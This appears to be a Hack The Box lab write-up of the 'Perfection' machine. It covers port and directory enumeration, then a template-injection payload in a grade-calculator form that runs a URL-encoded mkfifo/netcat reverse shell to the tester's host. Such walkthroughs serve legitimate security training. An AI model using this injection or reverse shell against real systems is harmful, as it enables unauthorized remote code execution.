---
description: https://app.hackthebox.com/machines/590
---

# Perfection

#### Service Enumeration

```bash
nmap 10.10.11.253 -T5 -A -p- -sV -sC

PORT   STATE SERVICE VERSION                                                                            
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)                       
| ssh-hostkey:                                                                                          
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)                                         
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)                                       
80/tcp open  http    nginx                                                                              
|_http-title: Weighted Grade Calculator                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Directory Enumeration

```bash
dirsearch -u http://10.10.11.253

[21:17:12] 200 -    4KB - /about 
```



Upon browsing to the HTTP service hosted on the machine, I am able to see there are more directories than first discovered by our initial dirsearch.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p><a href="http://10.10.11.253/weighted-grade">http://10.10.11.253/weighted-grade</a></p></figcaption></figure>

Filled the form and sent the intercept to repeater.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p><a href="http://10.10.11.253/weighted-grade">http://10.10.11.253/weighted-grade</a></p></figcaption></figure>

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.253/weighted-grade
Content-Type: application/x-www-form-urlencoded
Content-Length: 174
Origin: http://10.10.11.253
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

category1=Math&grade1=1&weight1=20&category2=Math&grade2=1&weight2=20&category3=Math&grade3=1&weight3=20&category4=Math&grade4=1&weight4=20&category5=Math&grade5=1&weight5=20
```



Encoded a netcat reverse shell payload via URL in Burp Suite's Decoder.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.9 4444 >/tmp/f
```

Encoded in URL

```
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%39%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66
```



Modified Repeater POST request

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.253/weighted-grade
Content-Type: application/x-www-form-urlencoded
Content-Length: 412
Origin: http://10.10.11.253
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

category1=a%0A<%25%3dsystem("%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%39%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66");%25>&grade1=1&weight1=20&category2=Math&grade2=1&weight2=20&category3=Math&grade3=1&weight3=20&category4=Math&grade4=1&weight4=20&category5=Math&grade5=1&weight5=20
```



Started netcat and sent the payload which returned a shell.

```bash
nc -nvlp 4444
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>NetCat Listener</p></figcaption></figure>

```bash
ls -las
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```bash
cat user.txt
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

